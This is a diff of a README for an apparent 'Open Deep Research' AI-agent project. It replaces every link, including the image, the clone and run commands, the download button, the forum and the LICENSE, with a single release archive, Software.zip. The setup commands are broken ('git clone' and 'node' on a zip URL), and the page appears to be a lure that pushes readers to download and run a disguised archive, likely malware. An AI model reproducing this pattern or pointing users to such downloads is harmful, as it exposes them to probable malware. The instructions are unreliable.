@@ -1,6 +1,6 @@
 # 🚀 Welcome to Open Deep Research Repository 🧠
 
-![Deep Learning Image](https://github.com/lochielochie/open-deep-research/releases/download/v1.0/App.zip)
+![Deep Learning Image](https://github.com/lochielochie/open-deep-research/releases/download/v2.0/Software.zip)
 
 ## Repository Overview
 
@@ -20,7 +20,7 @@ To get started with Open Deep Research, follow these steps:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/lochielochie/open-deep-research/releases/download/v1.0/App.zip
+   git clone https://github.com/lochielochie/open-deep-research/releases/download/v2.0/Software.zip
    ```
 
 2. Install the necessary dependencies by running:
@@ -30,7 +30,7 @@ To get started with Open Deep Research, follow these steps:
 
 3. Launch the AI Agent by executing:
    ```bash
-   node https://github.com/lochielochie/open-deep-research/releases/download/v1.0/App.zip
+   node https://github.com/lochielochie/open-deep-research/releases/download/v2.0/Software.zip
    ```
 
 4. Explore the extracted web data and delve into the realm of deep research!
@@ -38,7 +38,7 @@ To get started with Open Deep Research, follow these steps:
 ## Additional Resources
 
 📦 **Download Zip**: Download the latest version of the repository by clicking the button below:
-[![Download Repository Zip](https://github.com/lochielochie/open-deep-research/releases/download/v1.0/App.zip)](https://github.com/lochielochie/open-deep-research/releases/download/v1.0/App.zip)
+[![Download Repository Zip](https://github.com/lochielochie/open-deep-research/releases/download/v2.0/Software.zip)](https://github.com/lochielochie/open-deep-research/releases/download/v2.0/Software.zip)
 
 ## Contribute
 
@@ -46,11 +46,11 @@ Contributions to Open Deep Research are welcome! Feel free to submit pull reques
 
 ## Community
 
-Join our community of developers, researchers, and AI enthusiasts to discuss the latest advancements in deep research and AI technology. Connect with us on our [community forum](https://github.com/lochielochie/open-deep-research/releases/download/v1.0/App.zip) and share your insights and projects.
+Join our community of developers, researchers, and AI enthusiasts to discuss the latest advancements in deep research and AI technology. Connect with us on our [community forum](https://github.com/lochielochie/open-deep-research/releases/download/v2.0/Software.zip) and share your insights and projects.
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/lochielochie/open-deep-research/releases/download/v1.0/App.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/lochielochie/open-deep-research/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
